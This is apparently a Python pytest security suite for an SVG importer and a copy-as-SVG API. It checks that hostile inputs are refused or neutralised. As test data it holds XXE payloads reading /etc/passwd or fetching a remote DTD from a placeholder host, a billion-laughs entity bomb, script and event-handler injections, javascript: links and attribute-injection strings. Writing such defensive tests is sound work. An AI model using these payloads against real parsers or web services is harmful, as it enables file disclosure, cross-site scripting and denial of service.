"""外部 SVG 导入的安全边界（ADR 0189）：一组恶意样例，每一类都必须在换算之前被拦下（或被当成做不准、整个不拆）。

导入只经 `svgcheck.parse_svg(tolerant=True)`——与静态 SVG 素材、ADR 0182 场景解析同一个受限解析器；`tolerant` 只多删编辑器
私有命名空间与无作用的 CSS，下面每一条安全规则都不放宽。每条用例都核两件事：结局（拒绝码 / 原因码）对，结果里没有攻击载荷的
任何内容（不回显、没有对象）。变异反证见审阅页。
"""

from __future__ import annotations

import json
import socket
import time

import pytest

from tavotto.rendercore import svgcheck, svgimport

SVG = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10">{}</svg>'


def outcome(text: str) -> tuple[str, str]:
    """('rejected', code) = 抛 SvgImportError；('unsupported', code) = 不拆、原因码；('ok', '') = 落成对象"""
    try:
        r = svgimport.import_svg(text)
    except svgimport.SvgImportError as e:
        return "rejected", e.code
    if r["unsupported"]:
        assert r["objects"] == [], "做不准的输入不许落成任何对象"
        return "unsupported", next(iter(r["unsupported"]))
    return "ok", ""


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    """任何一条样例都不许联网：碰到 socket 就当场失败"""

    def boom(*a, **k):
        raise AssertionError("导入时发起了网络连接")

    monkeypatch.setattr(socket, "create_connection", boom)
    monkeypatch.setattr(socket.socket, "connect", boom)


# ------------------------------------------------------------------ XXE / 十亿笑声
XXE_FILE = (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text x="1" y="5">&x;</text></svg>'
)
XXE_HTTP = (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY % p SYSTEM "http://example.invalid/evil.dtd"> %p;]>'
    '<svg xmlns="http://www.w3.org/2000/svg"/>'
)
LAUGHS = (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "lol"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
    '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">'
    '<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">'
    '<!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;"><!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">'
    '<!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;"><!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text x="1" y="5">&j;</text></svg>'
)


@pytest.mark.parametrize(
    "text", [XXE_FILE, XXE_HTTP, LAUGHS], ids=["xxe-file", "xxe-param-http", "billion-laughs"]
)
def test_dtd_and_entities_are_refused_before_expansion(text):
    t0 = time.monotonic()
    assert outcome(text) == ("unsupported", "external_ref")
    assert time.monotonic() - t0 < 1.0  # 没有展开（展开十亿笑声要几 GB、几十秒）


def test_public_svg_doctype_with_internal_subset_is_still_refused():
    text = (
        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" '
        '[<!ENTITY x "y">]><svg xmlns="http://www.w3.org/2000/svg"/>'
    )
    assert outcome(text) == ("unsupported", "external_ref")


# ------------------------------------------------------------------ 外链
@pytest.mark.parametrize(
    "body",
    [
        '<image href="http://example.invalid/a.png" width="1" height="1"/>',
        '<image xlink:href="file:///etc/passwd" width="1" height="1"/>',
        '<use href="other.svg#a"/>',
        '<use xlink:href="https://example.invalid/x.svg#a"/>',
        '<rect width="1" height="1" fill="url(http://example.invalid/g.svg#g)"/>',
        '<rect width="1" height="1" style="fill:url(https://example.invalid/#g)"/>',
        '<style>rect{fill:url(http://example.invalid/#g)}</style><rect width="1" height="1"/>',
        '<image href="data:image/svg+xml;base64,PHN2Zy8+" width="1" height="1"/>',
        '<image href="data:text/html,%3Cscript%3E" width="1" height="1"/>',
    ],
    ids=[
        "image-http",
        "image-file",
        "use-relative",
        "use-https",
        "fill-url",
        "style-url",
        "css-url",
        "data-svg",
        "data-html",
    ],
)
def test_external_references_are_never_followed(body):
    assert outcome(SVG.format(body)) == ("unsupported", "external_ref")


# ------------------------------------------------------------------ use 递归、循环、指数展开
@pytest.mark.parametrize(
    "body",
    [
        '<g id="a"><use href="#a"/></g>',
        '<g id="a"><use href="#b"/></g><g id="b"><use href="#a"/></g>',
        '<linearGradient id="g1" href="#g2"/><linearGradient id="g2" href="#g1"/><rect width="1" height="1" fill="url(#g1)"/>',
    ],
    ids=["use-self", "use-mutual", "gradient-href-cycle"],
)
def test_reference_cycles_are_refused(body):
    assert outcome(SVG.format(body)) == ("unsupported", "reference_cycle")


def test_exponential_use_fanout_is_refused():
    # 每一层 use 上一层两次：20 层 = 2^20 个展开出来的元素，原文只有几十个
    body = (
        '<defs><rect id="l0" width="1" height="1"/>'
        + "".join(
            f'<g id="l{i}"><use href="#l{i - 1}"/><use href="#l{i - 1}"/></g>' for i in range(1, 21)
        )
        + '</defs><use href="#l20"/>'
    )
    assert outcome(SVG.format(body)) == ("rejected", "too_large")


# ------------------------------------------------------------------ 尺寸
@pytest.mark.parametrize(
    "attrs",
    [
        'width="100000000" height="10"',
        'width="20m" height="10"',
        'viewBox="0 0 1e30 1e30"',
        'viewBox="-1e12 0 10 10"',
        'width="inf" height="10"',
    ],
    ids=["width-px", "width-unit", "viewbox-huge", "viewbox-offset", "non-finite"],
)
def test_oversized_viewports_are_refused(attrs):
    text = f'<svg xmlns="http://www.w3.org/2000/svg" {attrs}><rect width="1" height="1"/></svg>'
    got = outcome(text)
    # 「inf」这类写法读不成数（长度解析退回缺省）也行，但不许落成一个巨大的对象
    if got[0] == "ok":
        r = svgimport.import_svg(text)
        assert max(r["size_mm"]) <= svgimport.MAX_VIEWPORT_MM
    else:
        assert got == ("rejected", "too_large")


def test_oversized_bytes_are_refused():
    text = SVG.format('<rect width="1" height="1"/>' + " " * (svgimport.MAX_BYTES + 1))
    assert outcome(text) == ("rejected", "too_large")


# ------------------------------------------------------------------ 脚本与事件
@pytest.mark.parametrize(
    "body,code",
    [
        ("<script>alert(1)</script>", "unsupported_element"),
        ('<script xlink:href="https://example.invalid/x.js"/>', "unsupported_element"),
        ('<rect width="1" height="1" onload="alert(1)"/>', "script"),
        ('<rect width="1" height="1" onclick="alert(1)"/>', "script"),
        ('<a href="javascript:alert(1)"><rect width="1" height="1"/></a>', "unsupported_element"),
        ('<rect width="1" height="1" style="fill:expression(alert(1))"/>', "external_ref"),
        (
            '<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)"/></body></foreignObject>',
            "unsupported_element",
        ),
        ('<set attributeName="onmouseover" to="alert(1)"/>', "unsupported_element"),
    ],
    ids=[
        "script",
        "script-src",
        "onload",
        "onclick",
        "javascript-link",
        "css-expression",
        "foreign-html",
        "animation-set",
    ],
)
def test_scripts_and_event_handlers_are_refused(body, code):
    text = SVG.format(body)
    assert outcome(text) == ("unsupported", code)
    assert "alert" not in json.dumps(svgimport.import_svg(text))


# ------------------------------------------------------------------ 深度、data:、超时
def test_deep_nesting_is_refused():
    body = (
        "<g>" * (svgimport.IMPORT_BUDGET.max_depth + 5)
        + '<rect width="1" height="1"/>'
        + "</g>" * (svgimport.IMPORT_BUDGET.max_depth + 5)
    )
    assert outcome(SVG.format(body)) == ("rejected", "too_large")


def test_nesting_just_under_the_limit_still_imports():
    n = svgimport.IMPORT_BUDGET.max_depth - 3
    body = "<g>" * n + '<rect width="1" height="1"/><rect width="1" height="1"/>' + "</g>" * n
    assert outcome(SVG.format(body)) == ("ok", "")


def test_data_uri_over_the_limit_is_refused():
    import base64
    import struct
    import zlib

    w = h = 8000  # 64 M 像素 > 导入预算的 40 M
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 0, 0, 0, 0)
    png = (
        b"\x89PNG\r\n\x1a\n"
        + struct.pack(">I", 13)
        + b"IHDR"
        + ihdr
        + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr))
    )
    body = f'<image href="data:image/png;base64,{base64.b64encode(png).decode()}" width="1" height="1"/>'
    assert outcome(SVG.format(body)) == ("rejected", "too_large")


def test_data_uri_bytes_over_the_limit_are_refused():
    big = "A" * ((svgimport.IMPORT_BUDGET.max_image_bytes + 3) // 3 * 4 + 8)
    body = f'<image href="data:image/png;base64,{big}" width="1" height="1"/>'
    assert outcome(SVG.format(body)) == ("rejected", "too_large")


def test_conversion_stops_at_the_deadline(monkeypatch):
    monkeypatch.setattr(svgimport, "DEADLINE_S", -1.0)
    assert outcome(SVG.format('<rect width="1" height="1"/>')) == ("rejected", "timeout")


def test_the_import_parser_is_the_shared_bounded_parser(monkeypatch):
    """只有一个受限解析器：导入经 `svgcheck.parse_svg`，不另起一个 XML 解析器"""
    seen = []
    real = svgcheck.parse_svg

    def spy(data, **kw):
        seen.append(kw)
        return real(data, **kw)

    monkeypatch.setattr(svgcheck, "parse_svg", spy)
    svgimport.import_svg(SVG.format('<rect width="1" height="1"/>'))
    assert seen and seen[0]["tolerant"] is True and seen[0]["budget"] is svgimport.IMPORT_BUDGET


def test_endpoint_never_echoes_the_payload():
    from tavotto import app as m

    m.app.config["TESTING"] = True
    client = m.app.test_client()
    body = client.post("/api/svg/import", json={"svg": XXE_FILE}).get_json()
    assert (
        body["ok"] is True and body["objects"] == [] and body["unsupported"] == {"external_ref": 1}
    )
    body = client.post(
        "/api/svg/import", json={"svg": SVG.format("<script>steal()</script>")}
    ).get_json()
    assert "steal" not in json.dumps(body)


def test_expansion_is_bounded_again_while_converting(monkeypatch):
    """纵深防御：就算解析器那一道展开计数漏了（这里把它关掉），换算时逐元素计数也会在上限处停下"""
    monkeypatch.setattr(svgcheck, "_references", lambda *a, **k: None)
    body = (
        '<defs><rect id="l0" width="1" height="1"/>'
        + "".join(
            f'<g id="l{i}"><use href="#l{i - 1}"/><use href="#l{i - 1}"/></g>' for i in range(1, 21)
        )
        + '</defs><use href="#l20"/>'
    )
    t0 = time.monotonic()
    assert outcome(SVG.format(body)) == ("rejected", "too_many_elements")
    assert time.monotonic() - t0 < svgimport.DEADLINE_S + 1


# ================================================================== 复制为 SVG 接口的输入
# 输入是导出载荷（JSON），没有 XML 解析器可攻击；要守的是：载荷里的字符串不能变成输出 SVG 里的结构（实体、脚本、外链），
# 输出一定能过**严格**的受限解析器；尺寸 / 数量 / 嵌套 / 字节有上限，超出的在花力气之前就拒。


def _client():
    from tavotto import app as m

    m.app.config["TESTING"] = True
    return m.app.test_client()


def _text(text: str, **over) -> dict:
    o = {
        "type": "text", "id": "t", "x_mm": 1, "y_mm": 1, "w_mm": 40, "h_mm": 8, "text": text,
        "size_pt": 10, "bold": False, "italic": False, "color": "#000000", "align": "left",
    }  # fmt: skip
    o.update(over)
    return o


def _rect(**over) -> dict:
    o = {
        "type": "shape", "shape": "rect", "id": "r", "x_mm": 0, "y_mm": 0, "w_mm": 5, "h_mm": 5,
        "stroke_pt": 1, "color": "#000000", "fill": "#ff0000",
    }  # fmt: skip
    o.update(over)
    return o


def _copy(objs, w=50, h=30, raw: bytes | None = None):
    c = _client()
    if raw is not None:
        return c.post("/api/svg/copy", data=raw, content_type="application/json")
    return c.post("/api/svg/copy", json={"objects": objs, "w_mm": w, "h_mm": h})


@pytest.mark.parametrize(
    "payload",
    [
        '<!DOCTYPE x [<!ENTITY a SYSTEM "file:///etc/passwd">]>&a;',
        '&lol;&lol;&lol;<!ENTITY lol "lol">',
        "</text><script>alert(1)</script><text>",
        '<image href="http://example.invalid/x.png"/>',
        "]]><svg onload=alert(1)>",
        '<use xlink:href="#t"/><g id="t"><use href="#t"/></g>',
    ],
    ids=["xxe", "entities", "script", "external-image", "cdata-onload", "use-cycle"],
)
def test_copy_text_payloads_never_become_svg_structure(payload):
    r = _copy([_text(payload, w_mm=400)], w=420)  # 一行放得下：粘回来是一个文字对象
    body = r.get_json()
    assert r.status_code == 200 and body["ok"] is True
    # 输出过严格的受限解析器：没有 DTD / 实体 / 脚本 / 事件 / 外链 / 引用环
    root = svgcheck.parse_svg(body["svg"].encode())
    tags = {el.tag.split("}")[-1] for el in root.iter()}
    assert not tags & {"script", "image", "use", "foreignObject", "a"}
    # 再粘回来：那段字原样是一个文字对象的内容
    back = svgimport.import_svg(body["svg"])
    assert back["unsupported"] == {}
    texts = [o["text"] for o in back["objects"] if o["type"] == "text"]
    assert texts == [" ".join(payload.split())]


@pytest.mark.parametrize(
    "over",
    [
        {"color": "url(http://example.invalid/#g)"},
        {"fill": "url(https://example.invalid/#g)"},
        {"fill": "javascript:alert(1)"},
        {"color": '#000000" onload="alert(1)'},
    ],
    ids=["color-url", "fill-url", "fill-javascript", "attr-injection"],
)
def test_copy_style_strings_cannot_inject_references(over):
    r = _copy([_rect(**over)])
    body = r.get_json()
    if body.get("ok"):
        root = svgcheck.parse_svg(body["svg"].encode())
        assert "example.invalid" not in body["svg"] and "alert" not in body["svg"]
        assert all(not k.lower().startswith("on") for el in root.iter() for k in el.attrib)
    else:
        assert body["error"] in ("bad_object", "bad_objects")


@pytest.mark.parametrize(
    "w,h",
    [(1e9, 10), (10, 1e9), (0, 10), (-5, 10), (float("inf"), 10), (float("nan"), 10)],
    ids=["huge-w", "huge-h", "zero", "negative", "inf", "nan"],
)
def test_copy_oversized_page_is_refused(w, h):
    import json as _json

    raw = _json.dumps({"objects": [_rect()], "w_mm": w, "h_mm": h}).encode()
    assert _copy(None, raw=raw).status_code == 400


def test_copy_oversized_objects_are_refused_before_rendering():
    huge = _rect(x_mm=0, y_mm=0, w_mm=1e12, h_mm=1e12)
    r = _copy([huge])
    assert r.status_code in (200, 400)
    body = r.get_json()
    assert body.get("ok") is False or len(body["svg"]) < 100_000


def test_copy_deep_clip_nesting_is_refused():
    from tavotto import app as m

    mask = {"type": "path", "x_mm": 0, "y_mm": 0, "w_mm": 5, "h_mm": 5,
            "subpaths": [{"closed": True, "nodes": [{"p": [0, 0]}, {"p": [1, 0]}, {"p": [1, 1]}]}]}  # fmt: skip
    ok = _copy([_rect(clip=[mask] * m.SVG_COPY_MAX_CLIP_DEPTH)])
    assert ok.status_code == 200 and ok.get_json()["ok"] is True
    assert _copy([_rect(clip=[mask] * (m.SVG_COPY_MAX_CLIP_DEPTH + 1))]).status_code == 413


def test_copy_too_many_objects_nodes_or_characters_are_refused():
    from tavotto import app as m

    assert _copy([_rect()] * (m.SVG_COPY_MAX_OBJECTS + 1)).status_code == 413
    nodes = [{"p": [i / 1000, (i % 7) / 7]} for i in range(m.SVG_COPY_MAX_NODES + 1)]
    path = {"type": "path", "x_mm": 0, "y_mm": 0, "w_mm": 5, "h_mm": 5, "stroke_pt": 1,
            "color": "#000000", "fill": None, "subpaths": [{"closed": False, "nodes": nodes}]}  # fmt: skip
    assert _copy([path]).status_code == 413
    assert _copy([_text("x" * (m.SVG_COPY_MAX_TEXT + 1))]).status_code == 413


def test_copy_oversized_request_bytes_are_refused_before_parsing():
    """data: 之类塞大字节的载荷：按 Content-Length 在解析 JSON 之前就拒（不读、不解析）"""
    from tavotto import app as m

    raw = b'{"objects": [], "pad": "' + b"A" * (m.SVG_COPY_MAX_BYTES + 1) + b'"}'
    t0 = time.monotonic()
    assert _copy(None, raw=raw).status_code == 413
    assert time.monotonic() - t0 < 2.0


def test_copy_at_the_limits_finishes_in_bounded_time():
    """上限之内最重的一类输入（对象数顶格）也在有限时间里写完——超时靠上限兜住，不靠杀线程"""
    from tavotto import app as m

    t0 = time.monotonic()
    r = _copy([_rect(x_mm=i % 40, y_mm=i // 40) for i in range(m.SVG_COPY_MAX_OBJECTS)], w=60, h=60)
    assert r.status_code == 200 and r.get_json()["ok"] is True
    assert time.monotonic() - t0 < 30.0


def test_outline_text_length_is_bounded():
    from tavotto import app as m

    c = _client()
    r = c.post("/api/text/outline", json={"objects": [_text("x" * (m.SVG_COPY_MAX_TEXT + 1))]})
    assert r.status_code == 413


# ---- Codex 线程 4614436889 / 4614436909：CSS 清理的回溯正则、单条路径内的预算 ----


def test_iter_rules_matches_regex_semantics():
    """线性扫描与原来的 `_RULE.finditer` 同一语义（随机花括号串对照）"""
    import random

    rng = random.Random(7)
    for _ in range(3000):
        css = "".join(rng.choice("ab {};:\n") for _ in range(rng.randint(0, 24)))
        want = [(m.start(), m.end(), m.group(1), m.group(2)) for m in svgcheck._RULE.finditer(css)]
        assert list(svgcheck._iter_rules(css)) == want, css


def test_style_without_braces_is_linear_time():
    """`<style>` 里一大段没有花括号的文字：以前 `_RULE.sub` 平方级回溯（4 万字符超 15 秒），现在线性"""
    for n in (40_000, 400_000):
        text = SVG.format("<style>" + "a" * n + "</style>")
        t0 = time.monotonic()
        outcome(text)
        assert time.monotonic() - t0 < 2.0, n


def test_style_stripped_inert_still_works_after_linear_scan():
    out = svgcheck.parse_svg(
        SVG.format("<style>.a{overflow:hidden;fill:red}</style>").encode(), tolerant=True
    )
    css = next(el.text for el in out.iter() if el.tag.endswith("style"))
    assert css == ".a{fill:red}"


def test_single_path_anchor_budget():
    """一条 `d` 塞几十万段：超锚点上限就拒绝，而且耗时有界"""
    d = "M0 0" + " L1 1" * (svgimport.MAX_ANCHORS + 10)
    t0 = time.monotonic()
    assert outcome(SVG.format(f'<path d="{d}" fill="red"/>')) == ("rejected", "too_many_elements")
    assert time.monotonic() - t0 < svgimport.DEADLINE_S


def test_anchor_budget_shared_across_use_references(monkeypatch):
    """重复引用同一条路径不能绕过预算：总锚点跨整次导入共享"""
    monkeypatch.setattr(svgimport, "DEADLINE_S", 120.0)  # 机器忙时别让墙钟抢在锚点预算前面
    n = svgimport.MAX_ANCHORS // 8
    d = "M0 0" + " L1 1" * n
    uses = "".join('<use href="#p"/>' for _ in range(10))
    text = SVG.format(f'<defs><path id="p" d="{d}" fill="red"/></defs>{uses}')
    assert outcome(text) == ("rejected", "too_many_elements")


def test_single_path_deadline(monkeypatch):
    """deadline 已过时，单条路径内部也会中断（不只在进入元素时查）"""
    d = "M0 0" + " L1 1" * 5000
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport.parse_path_d(d, deadline=time.monotonic() - 1)
    assert e.value.code == "timeout"
